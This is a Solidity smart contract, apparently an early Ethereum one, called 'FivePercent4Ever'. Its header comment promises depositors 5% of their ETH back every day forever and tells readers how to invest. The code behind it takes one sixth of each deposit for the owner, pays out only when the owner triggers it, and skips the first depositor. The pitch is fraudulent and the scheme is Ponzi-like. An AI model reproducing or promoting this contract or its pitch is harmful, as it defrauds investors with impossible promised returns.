/*
*
$$$$$$$$\ $$\                      $$$$$$$\                                                     $$\   $$\   $$\ $$$$$$$$\                            
$$  _____|\__|                     $$  __$$\                                                    $$ |  $$ |  $$ |$$  _____|                           
$$ |      $$\ $$\    $$\  $$$$$$\  $$ |  $$ | $$$$$$\   $$$$$$\   $$$$$$$\  $$$$$$\  $$$$$$$\ $$$$$$\ $$ |  $$ |$$ |  $$\    $$\  $$$$$$\   $$$$$$\  
$$$$$\    $$ |\$$\  $$  |$$  __$$\ $$$$$$$  |$$  __$$\ $$  __$$\ $$  _____|$$  __$$\ $$  __$$\\_$$  _|$$$$$$$$ |$$$$$\\$$\  $$  |$$  __$$\ $$  __$$\ 
$$  __|   $$ | \$$\$$  / $$$$$$$$ |$$  ____/ $$$$$$$$ |$$ |  \__|$$ /      $$$$$$$$ |$$ |  $$ | $$ |  \_____$$ |$$  __|\$$\$$  / $$$$$$$$ |$$ |  \__|
$$ |      $$ |  \$$$  /  $$   ____|$$ |      $$   ____|$$ |      $$ |      $$   ____|$$ |  $$ | $$ |$$\     $$ |$$ |    \$$$  /  $$   ____|$$ |      
$$ |      $$ |   \$  /   \$$$$$$$\ $$ |      \$$$$$$$\ $$ |      \$$$$$$$\ \$$$$$$$\ $$ |  $$ | \$$$$  |    $$ |$$$$$$$$\\$  /   \$$$$$$$\ $$ |      
\__|      \__|    \_/     \_______|\__|       \_______|\__|       \_______| \_______|\__|  \__|  \____/     \__|\________|\_/     \_______|\__|      

*     
*   https://fivepercent4ever.com
*
*   Deposit ETH and automatically receive 5% of your deposit amount daily Forever!
*
*   Each Day at 2200 UTC our smart contract will distribute 5% to all investors 
*
*   How to invest:   Just send ether to our contract address.   FivePercent4Ever will catalogue
*   your address and send 5% of your deposit every day forever. 
*
*   How to track:   check our contract address on https://etherscan.io 
*                   you will see your deposit and daily payments to your address
*                   Recommended Gas:  200000   
*                   Gas Price:        3 GWEI or more 
*   
*                   You can also visit our website at https://fivepercent4ever.com
*
*   Project Distributions:   84% for payments, 10% for advertising, 6% project administration
*
*/                                                                                                                                                   
                                                                                                                                                     


contract FivePercent4Ever
{
    struct _Tx {
        address txuser;
        uint txvalue;
    }
    _Tx[] public Tx;
    uint public counter;
    
    address owner;
    
    
    modifier onlyowner
    {
        if (msg.sender == owner)
        _
    }
    function FivePercent4Ever() {
        owner = msg.sender;
        
    }
    
    function() {
        Sort();
        if (msg.sender == owner )
        {
            Count();
        }
    }
    
    function Sort() internal
    {
        uint feecounter;
            feecounter+=msg.value/6;
	        owner.send(feecounter);
	  
	        feecounter=0;
	   uint txcounter=Tx.length;     
	   counter=Tx.length;
	   Tx.length++;
	   Tx[txcounter].txuser=msg.sender;
	   Tx[txcounter].txvalue=msg.value;   
    }
    
    function Count() onlyowner {
        while (counter>0) {
            Tx[counter].txuser.send((Tx[counter].txvalue/100)*5);
            counter-=1;
        }
    }
       
}